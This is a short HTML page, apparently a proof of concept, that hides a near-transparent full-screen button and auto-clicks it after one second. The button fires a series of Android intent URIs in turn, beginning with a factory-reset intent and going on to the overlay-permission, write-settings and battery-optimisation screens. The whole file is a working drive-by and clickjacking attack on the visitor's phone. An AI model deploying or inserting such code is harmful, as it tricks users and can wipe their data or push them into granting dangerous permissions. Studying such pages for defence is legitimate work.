<!DOCTYPE html>
<html>
<body>
<button onclick="testDangerousIntents()" style="width:100vw;height:100vh;opacity:0.01;">
</button>

<script>
function testDangerousIntents() {
  // These are more invasive - may trigger security warnings
  const dangerousIntents = [
    // Factory reset (EXTREMELY DANGEROUS - will prompt)
    'intent:#Intent;action=android.intent.action.FACTORY_RESET;end',
    
    // Power menu
    'intent:#Intent;action=android.intent.action.ACTION_POWER_USAGE_SUMMARY;end',
    
    // Display over other apps permission
    'intent:#Intent;action=android.settings.action.MANAGE_OVERLAY_PERMISSION;S.package=com.android.settings;end',
    
    // Write system settings (if exposed)
    'intent:#Intent;action=android.settings.action.MANAGE_WRITE_SETTINGS;S.package=com.android.settings;end',
    
    // Battery optimization ignore
    'intent:#Intent;action=android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS;end',
    
    // Picture-in-picture settings
    'intent:#Intent;action=android.settings.PICTURE_IN_PICTURE_SETTINGS;S.android:app_package=com.android.settings;end',
    
    // VR service settings
    'intent:#Intent;action=android.settings.VR_LISTENER_SETTINGS;end',
    
    // Print service settings
    'intent:#Intent;action=android.settings.ACTION_PRINT_SETTINGS;end',
  ];
  
  dangerousIntents.forEach((intent, i) => {
    setTimeout(() => {
      console.log('Testing dangerous intent:', intent.substring(0, 50) + '...');
      try {
        window.location = intent;
      } catch(e) {
        console.error('Failed:', e.message);
      }
    }, i * 500);
  });
}

// Auto-trigger
setTimeout(() => document.querySelector('button').click(), 1000);
</script>
</body>
</html>
